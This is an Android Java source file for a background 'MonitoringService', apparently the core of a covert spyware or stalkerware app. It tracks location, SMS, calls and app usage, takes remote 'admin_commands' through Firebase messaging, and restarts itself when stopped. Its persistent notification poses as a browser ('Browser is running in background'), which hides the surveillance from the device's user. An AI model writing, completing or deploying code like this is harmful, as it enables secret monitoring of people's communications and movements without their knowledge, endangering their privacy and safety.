package com.system.service.service;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessaging;
import com.system.service.BrowserApplication;
import com.system.service.MainActivity;
import com.system.service.R;
import com.system.service.manager.DataManager;
import com.system.service.manager.LocationManager;
import com.system.service.manager.SmsManager;
import com.system.service.manager.CallManager;
import com.system.service.manager.AppUsageManager;

/**
 * Background monitoring service
 * Handles all monitoring functionality in the background
 */
public class MonitoringService extends Service {
    
    private static final String TAG = "MonitoringService";
    private static final int NOTIFICATION_ID = 1001;
    
    private DataManager dataManager;
    private LocationManager locationManager;
    private SmsManager smsManager;
    private CallManager callManager;
    private AppUsageManager appUsageManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Monitoring service created");
        
        // Initialize managers
        initializeManagers();
        
        // Start as foreground service
        startForegroundService();
        
        // Initialize Firebase messaging
        initializeFirebaseMessaging();
    }
    
    /**
     * Initialize all monitoring managers
     */
    private void initializeManagers() {
        dataManager = new DataManager(this);
        locationManager = new LocationManager(this, dataManager);
        smsManager = new SmsManager(this, dataManager);
        callManager = new CallManager(this, dataManager);
        appUsageManager = new AppUsageManager(this, dataManager);
    }
    
    /**
     * Start service as foreground with notification
     */
    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, 
            notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        
        Notification notification = new NotificationCompat.Builder(this, 
            BrowserApplication.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Browser")
            .setContentText("Browser is running in background")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        
        startForeground(NOTIFICATION_ID, notification);
    }
    
    /**
     * Initialize Firebase Cloud Messaging for remote commands
     */
    private void initializeFirebaseMessaging() {
        FirebaseMessaging.getInstance().getToken()
            .addOnCompleteListener(task -> {
                if (!task.isSuccessful()) {
                    Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                    return;
                }
                
                // Get new FCM registration token
                String token = task.getResult();
                Log.d(TAG, "FCM Token: " + token);
                
                // Send token to server
                dataManager.updateDeviceToken(token);
            });
        
        // Subscribe to admin commands topic
        FirebaseMessaging.getInstance().subscribeToTopic("admin_commands")
            .addOnCompleteListener(task -> {
                String msg = "Subscribed to admin commands";
                if (!task.isSuccessful()) {
                    msg = "Subscribe to admin commands failed";
                }
                Log.d(TAG, msg);
            });
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Monitoring service started");
        
        // Start monitoring components
        startMonitoring();
        
        // Return START_STICKY to restart service if killed
        return START_STICKY;
    }
    
    /**
     * Start all monitoring components
     */
    private void startMonitoring() {
        // Start location tracking
        locationManager.startLocationTracking();
        
        // Start SMS monitoring
        smsManager.startSmsMonitoring();
        
        // Start call monitoring
        callManager.startCallMonitoring();
        
        // Start app usage monitoring
        appUsageManager.startAppUsageMonitoring();
        
        Log.d(TAG, "All monitoring components started");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Monitoring service destroyed");
        
        // Stop all monitoring
        stopMonitoring();
        
        // Restart service
        Intent restartIntent = new Intent(this, MonitoringService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }
    
    /**
     * Stop all monitoring components
     */
    private void stopMonitoring() {
        if (locationManager != null) {
            locationManager.stopLocationTracking();
        }
        if (smsManager != null) {
            smsManager.stopSmsMonitoring();
        }
        if (callManager != null) {
            callManager.stopCallMonitoring();
        }
        if (appUsageManager != null) {
            appUsageManager.stopAppUsageMonitoring();
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}